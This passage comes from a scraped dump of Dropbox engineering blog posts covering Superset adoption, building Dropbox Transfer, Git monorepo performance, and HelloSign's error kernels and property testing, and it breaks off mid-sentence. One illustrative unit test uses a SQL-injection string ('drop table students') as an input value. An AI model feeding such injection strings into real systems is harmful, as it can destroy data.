In short, we chose Apache S uperset because it was the best match to our specific internal needs. We were ready to invest engineering effort to close the gaps wherever needed. We also enjoyed contributing the following features back to the Superset project: Alert improvements S chema permissions model S lack integration Presto and Hive support in CI A nd more! As part of our decision-making process, we created this table which lists the key properties of the leading contenders. We’re happy to share it to help you make your own decisions. View or download the full-size comparison matrix here . Results Six months after we bet on Superset, it’s clearly been a big success at Dropbox. Superset had quick and strong adoption across the organization, and is now the main data exploration tool for our data warehouse. It has helped a number of teams to improve their workflows—so much so that they agreed to be quoted: It's been a game changer for us. It is much less friction than the previous flow, and it makes it easy to add new metrics. We'll be able to get much more visibility into how the various aspects of the sync engine are working, which will help us detect issues earlier and minimize their impact on our customers. —Core Sync Team Superset is great, the speed of queries is astounding! It has been a big upgrade for the team over our legacy tools and the dashboards are much easier to build. —Product Analytics Their praise is quantified by a chart of Superset’s Weekly Average Users at Dropbox following rollout: Superset Weekly Average Users trend following initial rollout (top), overall users and content created (bottom) Choose the best solution for your own biggest problems I’m proud of what we’ve built with Superset, but you should research and decide what your own priorities are before committing to a platform. In our case, user-friendliness was more important than flexibility and extensibility. Apache Superset stood out to us in ease of user adoption, yet was flexible enough to meet our needs. We’re lucky to be living in a time where there are a number of great solutions on the market that can provide powerful data exploration capabilities to your organization. We hope this post helps you make your own best decision. // Tags Application analytics superset data science business intelligence Standard Tags data visualization // Copy link Link copied Link copied", "date": "2021-01-19"},
{"website": "Dropbox", "title": "Engineering Dropbox Transfer: Making simple even simpler", "author": ["Nick Sundin"], "link": "https://dropbox.tech/application/engineering-dropbox-transfer--making-simple-even-simpler", "abstract": "Know your customer: the engineering edition Prototyping and building are the same optimization problem Part I: The throwaway prototype Part II: The enduring product Epilogue One of the challenges of application engineering within an established company like Dropbox is to break out of the cycle of incremental improvements and look at a problem fresh. Our colleagues who do user research help by regularly reminding us of the customer’s perspective, but so can our friends and family when they complain that product experiences aren’t as simple as they could be. One such complaint, in fact, led to a new product now available to all our users called Dropbox Transfer . Transfer lets Dropbox users quickly send large files, and confirm receipt, even if the recipient isn’t a Dropbox user. You could already do most of this with a Dropbox shared link, but what you couldn’t do before Transfer turned out to be significant for many of our users. For instance, with a shared link, the content needs to be inside your Dropbox folder, which affects your storage quota. If you are just one large video file away from being over quota, sending that file presents a challenge. And one of the benefits of a shared link is that it’s always connected to the current version of the file. This feature, however, can become a hassle in cases where you want to send a read-only snapshot of a file instead of a live-updating link. The more we dug into it, the more we realized that file sharing and file sending have very different use cases and needs. For file transfers, it’s really helpful to get a notification when a recipient has downloaded their files. This led us to provide the sender with a dashboard of statistics about downloads and views, prompting them to follow up with their recipient if the files are not retrieved. And unlike sharing use cases where link persistence is the expected default, with sending cases many people prefer the option of ephemeral expiring links and password protection, increasing the security of confidential content and allowing a “send and forget” workflow. Because of these differences we chose to build an entirely new product to solve these sending needs, rather than overcomplicating our existing sharing features. Listening to the voices of people around us (whether Dropbox users or not) helped us break away from preconceived notions based on what is easy and incremental to build on top of the Dropbox stack. This blog is the story of how Transfer was built from the point of view of its lead engineer, from prototyping and testing to production. Know your customer: the engineering edition As software engineers, we’re used to optimizing. Engineers have our fingerprints all over a piece of software. Things like performance, error states, and device platform strategies (what devices we support) are disproportionately decided by engineers. But what outcomes are we optimizing for? Do we focus on performance or flexibility? When aggressive deadlines hit, which features should be cut or modified? These judgements of cost vs. value are often made by an engineer hundreds of times in a typical month. To correctly answer these optimization questions, engineers must know our customers. Research is all around us Ideation Product development, as with machine learning, follows either a deductive or inductive reasoning path. In machine learning there are two major methods of training: supervised (deductive), and unsupervised (inductive). Supervised training starts with a known shape of inputs and outputs: e.g. trying to curve fit a line. Unsupervised learning attempts to draw inferences from data: e.g. using datapoint clustering to try to understand what questions to ask. In deductive product development, you build a hypothesis, “users want x to get y done,” and then validate with prototyping and user research. The inductive approach observes that “users are exhibiting x behavior,” and then asks, “what is the y we should build?” We built Transfer with the first approach and are refining it with the second. I will focus on the first in this post. So how does one come up with a hypothesis to test? There are many ways to come up with these initial seeds of ideas: open-ended surveys, rapid prototyping and iteration, focus groups, and emulation and combination of existing tools or products. Less often mentioned within tech circles is the easiest method of all: observing and examining your surroundings. Fortunately, at Dropbox, problems that need solving are not hard to find. Research is all around us, because the audience is essentially anyone with digital content. If we listen, we can let them guide us and sense-check our path. This is how Transfer got its start. My partner complained to me that they never could use Dropbox despite my evangelizing. It was simply too hard to use for simple sending. “Why are there so many clicks needed? Why does it need to be within a Dropbox folder to send? Why do I have to move all the files I uploaded into a folder?” When I heard we might be exploring this problem, I jumped at the opportunity. At the very least, I might be able to persuade my exacting sweetheart to use Dropbox! As the product progressed, I gained more confidence: I wasn’t sure if my accountant had received the files I sent with an email, a videographer friend wanted a quick way to send his raws over to an editor for processing. What started as a personal quest to persuade my partner quickly became a very global effort. Turns out she isn’t the only one who wants a new one-way sending paradigm within Dropbox. Not all tools are as general-purpose as Transfer, but overall, listening closely to people’s needs and feedback can quickly give directional guidance. For me, personally, it amplified my confidence that Transfer can have a large impact. This is one of the reasons, after five years, that I keep working here: Dropbox users are everywhere. My dad in his human biology research lab storing microscope images and files containing RNA; my neighbor storing contracts in Dropbox so they can read them on-the-go; some DJ in a club, choosing what track to queue up next using our audio-previews. Being a part of the fabric of everyday people’s lives is an incredible privilege. TL;DR : If you’re not sure if something makes sense, just ask a friend or two who might be in the target audience as a sense-check. Path to validation After these initial few sparks, from my experiences and the experiences and research of those on the team, we were ready to test out the idea. We attempted to clearly and strongly define the idea to either be right, or completely wrong. We did not want inconclusive results here, as that would waste us months or years of time. We set out to prove or disprove that, “Dropbox users need a quicker way to send files, with set-and-forget security features built in, like file expiration.” We started with an email and a sample landing page test: would people even be interested in this description? Turned out they were. Then, curious about actual user behavior, we graduated to a prototype with all the MVP features. In parallel, we ran a set of surveys, including one based around willingness-to-pay to make sure there was a market out there. Later on we started monitoring a measure of product-market-fit as we released new features (more on this later). As an engineer, it’s important to always understand this hypothesis and feel empowered to push back and suggest cutting scope if a feature doesn’t bubble up to the core hypothesis. This helps product and design hone their mission, users have a cleaner experience, and engineers reduce support cost for features that only 0.1% of users will ever use. A common trap of the engineering “can-do” attitude is enabling feature creep, and eventually a hard-to-manage codebase and a cluttered product. As with product and design, code should seek to be on-message, with the strongest and most central parts corresponding to the most utilized and critical components to an experience. Prototyping and building are the same optimization problem When an engineer starts optimizing for the customer and their use-case, the underlying technology and approach becomes bound to the spectrum of their needs. Code quality as a spectrum Every good engineering decision is made up of a number of inputs. These are things like: complexity to build resource efficiency latency compatibility with existing team expertise maintainability Given these traditional criteria, engineers might often fall into the trap of over-optimizing and unwittingly targeting problems the customer doesn’t care about. Making sure to always add customer experience to these engineering inputs will help align efforts to deploy the highest code quality on the highest customer-leverage areas. If you consider a user’s experience to be an algorithm, this really is just a riff on the classic performance wisdom that comes out of Amdahl’s law: focus on optimizing the places where customers are spending (or want to spend) the most valuable time. Remember: Hacky technical solutions can be correct engineering solutions. Optimizing the quality of unimportant parts will only lead to unimportant optimizations. Please note : I’m not advocating for writing a lot of messy fire-prone code, just for staying aware of the big picture at all times. Part I: The throwaway prototype We built a product we planned to delete in 2 months. Why not just build the actual thing? When exploring new product spaces, it is unclear where the user need (and/or revenue) lies. It’s usually helpful to decouple product learning from sustainability. When building a completely new surface, the optimized solutions for each of these are usually never the same. Learning: Optimize for flexibility. Do whatever it takes to show something valuable to a small set of users. This type of code might not even be code, but rather clickable prototypes built in tools like Figma. Sustainability: Optimize for longer-term growth. This type of code might include things like clearly-delineated, less-optimized “crumple zones” that can be improved as the product scales and needs to be more efficient. It should also include aspirational APIs compatible with extensions such as batching or pagination. How we did it Smoke and mirrors. We took an existing product, forked part of the frontend and applied a bunch of new CSS to make an existing product based around galleries become a “new” one based around a list of files. Only a few backend changes were needed. Mindful of its eventual removal, we surrounded all the prototype code with comment blocks like: Copy /* START: EXPERIMENT(TRANSFER) */\r\n<code>\r\n/* END: EXPERIMENT(TRANSFER) */ So we could quickly clean up after we were done. Results? After a month with it, people were sad to see it go, a sentiment we quantified with the Sean Ellis score . Sad enough to see it go that we had to take this to part II. Part II: The enduring product When it came time to tear down the temporary product—a prototype of hacks built on more hacks—our team needed to decide how we’d build the real thing. Fortunately, Transfer is built on the concept of files, and files are something that Dropbox does well regardless of what they’re being used for. Our efficient and high-quality storage systems, abuse prevention, and previews pipelines, optimized over many years, fit directly into our product. Unfortunately, moving up the stack, the sharing and syncing models could not be reused. While the underlying technology behind sharing and the sync engine has been rebuilt and optimized over the years (with the most recent leap in innovation being our Nucleus rewrite ), the product behavior and sharing model had remained largely unchanged for the last 10 years. The majority of the sharing stack assumed that files uploaded to Dropbox would always be accessible inside of Dropbox and take up quota. Additionally, there was also an assumption that links would refer to live updating content, rather than a snapshot of the file at link creation time. For the file sync infrastructure, there was an assumption of asynchronous upload: the idea that content would eventually be added to the server. For a product that was meant to immediately upload and share content while the user waits, the queuing and eventual consistency concept that had worked for file syncing would be disastrous for our user experience. While sync and share seemed homologous to sending, their underlying technologies had many years of product behavior assumptions baked in. It would take much longer than the seven months of development time we had to relax these, so we chose to rebuild large pieces of these areas of the stack rather than adapt the existing code (while leveraging our existing storage infrastructure as-is). The response to our prototype had given us the conviction to take this harder technical path in order to provide a specific product experience, rather than change the product experience to match the shortest and most immediately-compatible technical approach. It’s important to note that each decision to “do it ourselves” was done in conversation with the platform teams. We simply needed things that were too far-out and not validated enough to be on their near-term roadmap. Now that Transfer has proven to be successful, I’m already seeing the amount of infrastructure code our product-team owns shrinking, as our product partners add flexibility into their systems to adapt to our use-cases. In lieu of taking a hard dependency on our platform-partners, we were able reduce temporary inter-team complexity and accelerate our own roadmap by building our own solution. Our habit of choosing to actively reduce cross-team dependencies also proved essential in hitting our goals. When working in established codebases, here are some tips to keep things moving fast: Be creative Similar products are closer than you think. In our case, we found that sending photo albums had many similarities with what we were trying to do. This cut off months of development time as we were able to leverage some ancient, but serviceable and battle-tested, code to back our initial sharing model. Always ask about scale At large companies processes are often developed to work at the scale of their largest product. When working on new projects with user bases initially many orders-of-magnitude smaller than a core product, always start a meeting with another team by telling them your expected user base size in the near future. Teams might assume you’re operating at “main product scale” and base guidances around this. It’s your job to make this clear. This can save your team from never launching a product because they’re too busy solving for the 200M user case before solving for the 100 user one. Learn about users other than yourself One thing we did early on was to build a set of internationalized string components. This took us extra time initially, but, armed with the knowledge that roughly half of all Dropbox users speak a language other than English, we knew the user impact would be well worth our time. One of our prouder engineering moments was when we were about to launch to the initial alpha population and got to tell the PM, who had assumed we hadn’t translated the product, that we should include a global population in the pre-release group. She was ecstatic the engineers had self-organized and decided this needed to be done. Know what can change and what can’t Sometimes things just can’t be done in a timely fashion. If they don’t contribute to the core identity of the product, consider letting them go. For us, this was the decision to initially not support emailing Transfers. Sending by copying a link was good enough for beta. Always know where you are and where you want to be When reviewing the specs for wide-reaching changes or reading the new code itself it’s useful to ask two questions: Where is this going? What is the ideal state of this? Where along this path is this? What number of stepping-stones should I expect to be looking at? We would constantly step back from decisions around what’s important and what’s not in terms of building the core identity into the product. We’d also constantly assess how easy it would be to change our minds if we had to ( Type I vs Type II decisions , in Jeff Bezos’ lingo). Some of the hardest calls were around our core, critical path code, code that would process hundreds of thousands of gigabytes per month. These were for us, the (initial) file uploader and our underlying data storage model, inherited code which was neither the cleanest nor the best unit-tested. Due to time and resource constraints, we had to settle for simply “battle tested” and “present” over other factors. The file uploader we chose for the web version of Transfer was the same uploader used on a number of other areas of the website, primarily file browse and file requests. This uploader was based on a 2012 version of a third-party library called PLupload, a very full-featured library providing functionality and polyfills that would go unused by our product. Since this uploader worked, it was hard to justify a rewrite during the initial product construction. However, as this library (at least the 2012 version of it) was heavily event driven and mutates the DOM, it immediately started causing reliability issues when wrapped inside a React component. Strange things started happening: items would get randomly stuck while uploading during our bug-bashes. Long-running uploads would error due to DOM nodes disappearing suddenly, causing a cascade of node deletions as React tried to push the “hard-reset” button on the corrupted DOM tree. We chose to keep it, but as abstracted away as possible. We took a similar approach to the Nucleus migration: we started out by building an interface exposing every feature of PLupload we wanted to use. This interface consisted of our own datatypes rather than PLupload’s. This served two roles: Testing got much better as we had a boundary. We were able to both dependency inject a mock library to test the product code, and also connect the inner code to a test harness with clear expectations around I/O of each method. The added benefit of this boundary was that it would eventually act as a shim when we had time to swap out the library with something simpler. This also forced us to come up with our requirements for a rewrite ahead of time, greatly increasing the productivity of the rewrite. The underlying sharing code we chose was based not around the well-maintained Dropbox file and folder sharing links, but rather a much older link type created initially for sharing photo albums. These album links allowed us to quickly stand up functional Transfer links. The benefit was that we were adapting a known system: other teams knew what these links were. Customer experience team was able to reuse playbooks and guides surrounding these links, Security and Abuse teams already had threat models and monitoring on these links, and the team owning the sharing infrastructure already had context. By not having to build new infrastructure, we were able to reduce variables, allowing us to focus more on product development than foundational changes. To allow us to migrate to a new system later, as with the web uploader, we wrapped this ancient set of helpers in our own facades. As our scaling up and launch played out, it became clear we had made the correct architecture calls: These parts had held and performed. Good engineering can be as much about action as it is about restraint. When we did revisit these later, we had the space to take a more thoughtful and holistic approach than we would have months earlier. Note: In early 2020 we migrated entirely off storing our data in the photo-album system, giving us both reliability, maintainability, and performance improvements. A strong culture of discourse Each crossroad can be critical. Having a culture of inclusion where each voice is considered based on an argument’s merit is an essential component of making key technical calls correctly. When core questions like the ones above come up, answering them incorrectly can lead to long detours, future tech debt, or even product collapse. Sometimes maintaining a badly-built product is more costly than the value it creates. In the specific case of reusing the photo album code, one of my teammates vehemently opposed the idea of taking on the tech debt from this system. The ensuing discussion over the course of a few weeks resulted in a number of proposals, documents, and meetings that uncovered and evaluated the time commitments required for different alternatives. Although we chose to take the photo album code with us to GA, the points raised through these meetings galvanized the short-term approach, backfilling the thoughtfulness that was either unspoken or lacking in its initial proposal, and brought the team together on a unified short-and-long-term vision for our sharing model’s backing code. These meetings helped set the eventual roadmap for complete migration off of the system. Without a well-knit team motivated to speak their mind at each intersection, the quality of these decisions can grow weak. I was lucky enough to work with 10 amazing engineers in a culture of open discourse on phase II of this project. I remember many afternoons spent working with the team to find our best path forward, balancing concerns from one engineer’s lens and another’s. Throughout, the glue that kept us moving forward through these discussions was the user need. Before each meeting, we’d try to articulate the “so what” of it all, and at the end try to bring it back again to the user. Whether this was a due-date we needed to hit for a feature or a level of quality expected, we could all align around the user as our ultimate priority. When we disagree, we ask “What would the user want?” and use that as our compass. Keeping that customer voice growing in each of us, through things like subscribing to the feedback mailing list or participating in user research interviews has proved crucial to our success as an engineering team. It is not enough to just have product managers, designers, and researchers thinking about the customer, engineers must as well. Epilogue As Dropbox Transfer adoption grows and the product expands and evolves, it remains important to reflect on its roots. The Transfer team remains committed not just to the “what,” of the product but the “why.” As we learn even more about our users from their feedback, we realize the process has just begun. Now every time we hear someone at the office or in a coffee shop complain about a file they were unable to send, we prick our ears, roll up our sleeves and smile, knowing that our work is not done yet. Best of all, my partner currently uses Transfer—and finally admits that I do useful things during the day. // Tags Application Sharing Files Culture UI // Copy link Link copied Link copied", "date": "2020-06-26"},
{"website": "Dropbox", "title": "Speeding up a Git monorepo at Dropbox with <200 lines of code", "author": ["Utsav Shah"], "link": "https://dropbox.tech/application/speeding-up-a-git-monorepo-at-dropbox-with--200-lines-of-code", "abstract": "Towards a monorepo Gitting faster We migrated from Mercurial to Git in 2014 to improve local performance and began consolidating our repositories that hosted our backend code. But as this monorepo grew, we experienced Git performance issues that grew linearly with the number of files we added. Inconveniently, this problem was the most severe on macOS—the platform most of our engineers work on. Fortunately, between upstream improvements in Git itself and a small wrapper of custom code, we’ve been able to speed Git operations up without fragmenting our unified and growing repository. Towards a monorepo Originally, our code was distributed across several dozen Mercurial repositories. But around 2014, we tested and found that we’d have better local performance with Git. More importantly, Git had become an industry standard tool that most new engineers had already used. So, over the course of a few Hack Weeks, a small group of engineers migrated many of our repositories from Mercurial to Git, and planned to migrate the rest. The backend business logic for Dropbox at the time lived mainly in a monolithic Python web application, with infrastructural components built independently. Over time, we extracted targeted components from the monolith into separate services, but a large number of our engineers still contribute to the monolith. For example, Magic Pocket , our custom block storage system was built separately from day one, while our metadata store, Edgestore , started off as a simple client side Python library that eventually spun off into a sophisticated service. In practice, this meant the monolith was the largest and often the only consumer of a smaller service or some code in a separate repository. Consequently, developers would write integration tests for these services in the monolith’s repository. These tests often failed when the service’s code changed, and since our continuous integration (CI) process simply ran all tests at HEAD for each repository (with no notion of pinning), it was hard to diagnose the root cause of problems. The large frequency of changes meant there would be multiple failures a week. Debugging test failures, tracking down changes, and fixing the build before the daily release was a painful process. It caused a lot of work for the release engineers and made the release process slow and inconsistent. Due to the indeterminate nature of these test failures, engineers didn’t trust CI test results and inspect failures, which led to more problems. To solve this, we needed a single commit identifier to reproducibly determine the state of the code we were testing. We either needed a polyglot tool (or a set of tools per language) to pin versions for each dependency directly, a repository-based pinning mechanism like git subtree , or to merge our repositories into one. For a while, we had a “super repo” that received a check-in every time one of the server-related repositories changed (via a Git pre-receive hook). This provided a global ordering on changes and test results, and helped narrow down the repository that caused a breakage. Eventually we realized it would be simplest to merge all relevant repositories. The combined repository size was not that large (~50,000 files), and we estimated that Git performance would be acceptable for at least a few years. This merge, combined with various other initiatives to improve testing infrastructure and quality, helped us keep master much stabler with much less work, and smoothed our release processes. Eventually, we’ve seen even more benefits, like simple code sharing, easy large scale refactoring, good operability with monorepo centric build tools like Bazel , and simple automatic bisects and reverts . This worked for us for a few years, but as expected, Git performance started degrading. Specifically, it seemed to degrade linearly with the number of files being added to the repository. Common operations like git status were getting slower with time. So in late 2017, we started investigating the various options to speed up Git for our users. Gitting faster To start off with, checking in large files severely impacts the performance of many operations in Git. Fortunately, we didn’t have workflows that depended on this, and we set up a pre-receive hook to limit the size of new files pushed to our repositories and prevent regressions. macOS is the supported development platform for Dropbox engineers, but they’re free to use other platforms as they see fit. For example, an engineer working on the Dropbox desktop client might work on Windows, and some server engineers prefer Linux. In practice, most of our server engineers use macOS, and that’s where we focused our efforts. In order to tackle local Git performance, we needed to control the version of Git that developers on macOS used. Additionally, we had to measure performance. We created a small fork of Git that measured timing of operations like git status and git pull , had it automatically provisioned and installed on developer machines, and munged $PATH so that developers use our Git over the ones installed by the system or Homebrew. Copy which git\r\n/opt/dropbox-override/bin/git At the time, git status took over two seconds on average. In our case, many Git operations were slow and grew linearly since they ran the lstat syscall on every file in the repository to check if it’s up to date. Since most developers modify a small subset of files, this is wasted cycles in most cases. Interestingly, git status was 5-10x faster on Linux compared to macOS. There has been substantial work in the open source community to speed up Git for large repositories in the last few years. For example, Git now has a file system monitor (fsmonitor) to detect changed files, which is integrated with Watchman , a daemon to watch and buffer filesystem changes. Fsmonitor is a Git hook, and acts as a thin wrapper around Watchman. This is a useful abstraction for internal Git tests, and would be helpful if there's a need to use an alternate file watcher or migrate away from Watchman. Git uses an index file that contains an entry for each file in the repository, and determines what files are staged for commit. The index also supports extensions for various features like fsmonitor, and his file has the ability to cache results from fsmonitor. A Git operation that needs local filesystem state, like add , status , or diff , checks with Fsmonitor for changed files, and updates the index if there are any changes. How Git, Fsmonitor, and Watchman work on macOS The index is sorted by file path by default. So common operations like adding a file to the index (via git add ) requires a full index rewrite to insert the new path in the right place, which is slow for repositories with large indices. Git also introduced a new --split-index mode to convert the index format, so deltas could quickly be appended to a split index file and eventually consolidated into a few shared index files, making index writes significantly faster. Finally, there is an untracked cache mode that cached directory mtimes so Git could skip traversing unmodified directories. We deployed fsmonitor and Watchman to developer MacBooks and released some instructions on how to turn it on. Unfortunately, there were both performance bugs, where Git seemed to ignore fsmonitor data in some cases, and correctness bugs, where operations like git status sometimes returned wrong results with fsmonitor enabled. We dug into these and fixed some bugs , but ultimately shifted our focus when we lost team members with Git expertise and had other priorities. In the second half of 2019, our repo had reached >250k files, and we decided to refocus on this problem. An upstream bugfix looked promising, and we fixed one large performance issue . This time, we were confident to enable these improvements for all our users without their intervention. One of our core principles was shipping developer tools that would be configured correctly for everyone by default. We settled on shipping a wrapper on top of Git that would automatically tweak configs and enable fsmonitor for developers (if it wasn’t already turned on) only for a whitelisted set of repositories. This is very similar to Microsoft’s Scalar in principle, but without most of the features, and without the need for developers to learn an additional tool and run additional commands. We incrementally rolled out Git over the first week of December 2019 We saw a significant reduction in p50 and p90 durations for common operations. It’s worth noting that these operations are nowhere as fast as running Git in a smaller repository, but they’re a big improvement from the status quo, and acceptable for most purposes. We are also sure that these times are not growing linearly with the number of files in the repository. Finally, all of this was enabled through <200 lines of custom plumbing code around Git with no additional services (or large virtual filesystems) to maintain. There’s exciting work being done in open source to improve version control performance for large repositories, for both Git and Mercurial. With some prep work, like disallowing large files and setting up the right flags for clients, Git can perform reasonably well with almost zero ongoing maintenance burden. There are many trade-offs when deciding between a monorepo and multiple repositories, but version control scalability should not be a dealbreaker for a long time. Acknowledgements Dozens of engineers contributed to the work described above over many years, from the Mercurial to Git migration, to the repository merges, and finally work described to speed up Git. The various current and former Dropboxers include Tim Abbott, Jon Goldberg, Nipunn Koorapati, Jason Michalski, Greg Price, Mike Solomon, and Alex Vandiver. Also, many thanks to the maintainers of Git, and the various Microsoft engineers who helped review our patches and contributed several major features to Git like the file system monitor. And kudos to Facebook for building and open sourcing Watchman, and Charles Strahan, who wrote the go watchman library we use. // Tags Application Open Source Bazel back end git version control // Copy link Link copied Link copied", "date": "2020-06-10"},
{"website": "Dropbox", "title": "Building for reliability at HelloSign", "author": ["Kenneth Cross"], "link": "https://dropbox.tech/application/building-for-reliability-at-hellosign", "abstract": "Kernel panic! A brief guide on how to save the day How we use property testing Conclusion Filling out forms is stressful and boring, so people avoid it. If getting people to fill out forms is critical to your job or your business, you know what a big problem this is. HelloWorks is a HelloSign product that’s solving this problem through automating the process of converting PDF forms into an intelligent, mobile-friendly format that boosts accuracy and completion rates. Data collection is critically important both to the organization requesting the information as well as the person filling out the form. The end-to-end reliability of this process is one of its most important requirements, and one we’ve spent an incredible amount of time and effort on. Kernel panic! It’s the end of another chilly day as the setting sun turns the inhabitants of San Francisco into blind mice running through a maze. Meanwhile, another late night is slowly shifting to early morning, stuffed inside of a closet sized meeting room as we solve yet another gnarly technical challenge. Favoring speed over stability has led to increasing technical debt. After a couple months of dealing with the fallout, our engineering team took a step back to look holistically at why some unexpected behaviors were happening. We traced the overwhelming majority back to the application’s core. To fix this, we decided to bucket code into three tiers dubbed the error kernel , core features , and extended features . An error kernel is the part of an application or system that should never fail. This is ideally as small as possible since the less surface area that it has, the less likely catastrophic failures will happen. When they do happen, the core system is small enough to reason about which greatly helps with triage and cauterizing of wounds. The book Reactive Design Patterns describes the principle of an error kernel as , “in a supervision hierarchy, keep important application state or functionality near the root while delegating risky operations towards the leaves.” What does that mean to the ordinary monolithic application designer? This concept originated in Erlang which is, humorously, an accidental real world implementation of the Actor Model . Having an actor framework would be helpful for most application developers, but the error kernel principle is still applicable without one. Using an error kernel helps you discover failure domains: the ways in which a method, module, service or function can fail in a system. In a monolithic application, it’s ideal to have a single core mechanism to handle all errors. This helps you understand what errors are recoverable, and which are critical because they contain the logic for what happens next. By tracing where failures occur in an application, the architecture becomes clear and reveals where weaknesses exist. Another benefit of an error kernel is the prioritization of failures. The failures that occur inside of critical application infrastructure are the areas that need to be hardened and if possible isolated from the rest . This is what Joe Armstrong, one of Erlang’s original designers, meant by having an error kernel in general, not the specific actor model implementation of it. For example, HelloWorks has two independent error kernels for the two core services that we run. One is in our portal and the other is in the end-user application. Both involve the initialization and error handling of the services since without those nothing else is possible. The following illustration explains three valid architectural choices to designing an error kernel. In HelloWorks, we use the Actor Model design in our servers and the Monolithic one in our clients. Regular application development doesn't touch the error kernel much since it's intended to be small. Most of the action is in the next tier, core features . These are areas where the system can recover from issues but it will require significant effort. Things like data corruption and inconsistencies are painful but ultimately recoverable events in most scenarios. The core business logic of an application falls into this tier. Some might think that critical business logic should reside inside of the error kernel since without the business logic there is no value to the application, but the problem here is with application stability. If an application keeps falling down because of a critical business logic failure, this is an infrastructure and architecture problem. Infrastructure should remain stable and available regardless of the business logic, even when it’s wrong. In our two core services, building and running a workflow are two examples of critical business logic. Most other things fall into the last tier, extended features . These are the things that are irritating to a user when they go wrong but can be fixed with minimal risk. Just adding layers to the pyramid that was described above is a semantic change but not really an architectural one. Bucketing features and development this way gives teams a common language to use across engineering, product, and design. This helps to specify the complexity of features and how fundamental they are to a system. Thinking about the application this way quickly answers questions such as whether or not a feature can be hacked together quickly or if it really needs to be thought about deeply, indicating how fast you can reasonably expect it to ship. In other words, things that only affect the extended features can be developed quickly and hacked together in a short period of time since they do not have a lasting impact on any other critical system components. Extending the core system to support a new type of launch mechanism is inherently riskier which means it needs to be tested at a higher level before being released into the wild. The question then becomes, how do we rigorously test our error kernel and our core features so that we can reliably build new features and extend core mechanisms of the system reliably? Most systems don’t require formal verification which ties the application to its implementation strictly making changes costly to verify. A happy medium between flexibility and ease of use is property-based testing, which validates the behavior of systems. This approach allows for moving quickly to build the right thing while still being flexible with requirements. It also turns the mind-numbing task of writing tests into the intellectual challenge of automating the writing of tests. Mentally, there is a paradigm shift which turns programs into properties that hold true rather than a series of tests to pass. Writing properties allows for the possibility to both check and define the invariants of a program. What makes the method impressive is how it treats test failures. When a complex failure is discovered, the case is shrunk down to its simplest form, its principle, making it easier to understand. At a high level, a property test will include a generator and a property. A generator is a description of data that will be the input of the module to be tested. A property is a generic outcome that is always true based on the generated inputs to the module being tested. Applying the same logic from math, the example is a simple demonstration of a property that is easy to reason about. Here’s an example closer to home. Every successfully saved object in a database is retrievable by a UUID. The following properties are: Only one object is retrieved on a successful save. The object remains unchanged after being saved on retrievals. Every object of type X can be saved. No database row exists when retrieving an object from a UUID that does not exist. UUID should not exist when there is a failure to save. Generators are different than fuzzing because they define a problem-space . The generators do this by limiting the range of randomly generated values. A brief guide on how to save the day The superpower that property testing has is its ability to find bugs before users report them. In many cases, those bugs are non-trivial edge-cases, although it finds trivial ones too. A few really-easy-to-implement property tests that add relatively high value quickly can be done on code paths centered around regular expressions. Creating a generator that can build the expected string input can test a module so that the regex either does what is expected or catches all the failure that passes through validation. For example, when a regex is being applied as a filter to prevent invalid input into another function, it becomes a simple way to test both the validator doing its job and the function it’s passing its filtered input into. That was a mouthful, in other words: Copy fn send_email(msg, addr) ->\r\n  if valid_email_addr(addr) {\r\n    really_send_email(msg, addr)\r\n  }\r\nend\r\n\r\nproperty status_code(200) == send_email(msg, generated_valid_email_addr) In this case, assuming perfect network stability, two classes of errors are possible from the addr variable. The first is that the validator itself fails never sending any email. The second is that really_send_email is called but it fails due to a bad address that passed validation addr . Here, we're able to catch two potential classes of bugs with a single property test! It also makes unit tests in three locations redundant for the most part. Modeling The modeling pattern is building a property test that re-implements the same system that is being tested but in a way that makes the outcomes obvious. By eliminating optimizations and other unnecessary code like logging, the model system becomes easier to reason about. The nice thing about this approach is that once its built, there is a true equivalency test to base any future modifications to the production system on. This actually allows people to refactor the system without affecting the behavior of it in order to either extend or optimize it further! Symmetric Properties It’s not always feasible to create models and so there is another class called symmetric properties. These are highly useful for systems that translate data from one representation to another. Think about data serialization, marshaling, and encoder/decoder combinations. These always have the flavor of an identity proof which probably seems obvious to some. What makes property testing desirable here is the generated data is able to test the entire problem-space instead of a few examples that are known to be correct. This property can be summarized as: Copy fn encode(x) -> ...\r\n    fn decode(y) -> ...\r\n    property input == encode(decode(input))\r\n    property input2 == decode(encode(input2)) Stateful Properties So far, these tests have focused on stateless properties but all of these techniques equally apply to stateful properties. These tests are more advanced but worth the effort. Many systems have states that transition from one type to the next. Stateful properties make it possible to traverse the problem-space, or rather, all of the allowed state transitions. Using example-based scenarios can leave a lot of gaps because they're always testing the same scenarios without variation. Building a model to test these transitions helps engineers understand the complexity of a system and eliminate errors before testing is even complete. This makes stateful tests incredibly valuable because intermediary transitions in many systems can loop between transitions infinitely many times. By utilizing them, new state transitions will be traversed on each run with the potential to catch inconsistent behavior through the complex interactions of data manipulations between the different state transitions. How to Ruin the Day When I first started pursuing property testing, I bundled a bunch of properties together with a single generator. This was a terrible idea for a few reasons. It made the generator's code unnecessarily complicated When properties do fail their tests, it is very difficult to know what specifically generated the failure, making them more difficult to debug The tests will run slower since the generated inputs will be larger since there are more of them The tests might actually contain less diversity in the generated values by bundling properties and generators together The reasons they seem like good ideas are the following: Bundling treats a single generator like a master generator, making it possible to use the same generator to test all properties on a given entity It's less route work which removes the ceremony and boiler plate that comes with it In some cases, tests may run faster but the more complicated generators become the more time it takes to generate inputs The speed-up comes from generated inputs that can be reused to test multiple properties In the email example, if we also tested the msg variable, it would be harder to guess if the test failed due to an invalid addr or invalid msg . For this reason, isolating individual properties and generators make them easier to read, write, and diagnose failures. Copy msg = generate_msg()\r\naddr = generate_addr()\r\n\r\n# if this fails then who is responsible?\r\nproperty status_code(200) == send_email(msg, addr)\r\n\r\n# better to separate properties like this so failures are clear\r\nproperty status_code(200) == send_email(\"valid message\", addr)\r\nproperty status_code(200) == send_email(msg, \"asdf@qwerty.ai\")\r\n\r\n# targeted unit tests are clear and quick but writting many becomes burdensome\r\ntest status_code(200) == send_email(\"\\\"; drop table students;\", \"simple@email.com\")\r\ntest status_code(200) == send_email(\"message\", \"a.b.c+1234@hack.io\") In the code snippet above, the last point is that while unit tests can be quick and clear, if there are a lot of test cases then it would also require updating all the test cases when requirements change. For instance, if we pass back a 300 on the status code instead of a 200, then updating a large number of unit tests would be very annoying but updating a couple property tests that generate many test cases is far less daunting. Ultimately, this makes clear generator targets and clear properties very valuable. How we use property testing Property testing is a continuous and evolving process. Currently the forms in HelloWorks contain complicated logic within them that is not directly noticeable at first glance when building them. Both the building and publishing phases are currently undergoing some remarkable work but part of this stabilization process uses modeling as described above to remove inconsistencies and detect errors. As we move away from a validation-based system and towards parsed-based language, 